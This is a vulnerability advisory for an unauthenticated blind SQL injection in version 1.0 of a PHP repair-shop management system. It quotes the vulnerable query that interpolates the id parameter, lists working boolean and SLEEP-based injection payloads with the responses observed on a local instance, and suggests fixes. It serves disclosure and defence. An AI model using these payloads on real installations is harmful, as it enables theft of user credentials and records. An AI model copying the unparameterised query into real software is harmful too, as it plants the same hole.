# SourceCodester Computer Repair Shop Management System (PHP/OOP) 1.0 /index.php?p=admin/user/manage_user&id= SQL injection (Unauthenticated)

## Author

- qwer1230011108

## Vendor Homepage

- https://www.sourcecodester.com/php/15288/computer-repair-shop-management-system-phpoop-free-source-code.html

## Vulnerable File

- /index.php (authless ?p= router) -> admin/user/manage_user.php:3 (+admin/transactions/manage_transaction.php, update_status.php, view_details.php, admin/services/manage_service.php)

## VERSION(S)

- 1.0 (current public download, 2026-11)

# PROBLEM TYPE

## Vulnerability Type

- SQL Injection, Unauthenticated (boolean-based and time-based blind) (CWE-89)

## Root Cause

The root index.php routes ?p= to any page fragment without an authentication check, and the fragments interpolate $_GET['id'] into quoted SQL:

```php
// admin/user/manage_user.php:3
$user = $conn->query("SELECT * FROM users where id ='{$_GET['id']}'");
```

Existing CVEs for this product cover admin/products/manage_product.php (CVE-2026-10263) and classes/Master.php delete_product (CVE-2026-19021); the user-management and transactions fragments above are not covered by any published advisory.

## Impact

Unauthenticated extraction of the users table (credential material) and all transaction records via blind injection, through the same authless router that exposes every administrative fragment.

# No login or authorization is required to exploit this vulnerability

# Vulnerability details and POC

Local instance 127.0.0.1:8161, no cookies:

```
p=admin/user/manage_user&id=1                    -> 200, user form rendered, no login redirect
p=admin/user/manage_user&id=1' AND '1'='1        -> 19416 bytes (TRUE)
p=admin/user/manage_user&id=1' AND '1'='2        -> 19467 bytes (FALSE)
p=admin/user/manage_user&id=1' AND SLEEP(5)-- -  -> 5.08s
(also rendered unauthenticated: transactions/manage_transaction, update_status, view_details, services/manage_service)
```

Transcript: poc/F1-unauth-sqli.txt (reproduce: python -I scripts/_crsms_poc.py, 127.0.0.1 only).

# Suggested repair

1. Prepared statements with bound parameters for every id lookup.
2. Whitelist + authenticate the ?p= router; administrative fragments only through the authenticated bootstrap.
